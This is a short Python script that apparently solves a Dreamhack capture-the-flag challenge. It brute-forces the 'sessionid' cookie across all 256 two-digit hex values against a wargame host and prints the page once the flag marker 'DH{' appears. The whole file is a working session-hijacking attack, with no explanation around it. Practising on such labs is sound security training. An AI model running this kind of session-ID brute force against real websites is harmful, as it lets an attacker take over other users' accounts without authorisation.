import requests


url = "http://host8.dreamhack.games:11490/"
login_url = url + "login"
session_key = 'sessionid'

possible_values = [f'{i:02x}' for i in range(256)]

for session_id in possible_values:
    cookies = {session_key: session_id}
    
    response = requests.get(url, cookies=cookies)
    
    if "DH{" in response.text: 
        print(f"Found valid session ID: {session_id}")
        print(response.text)
        break
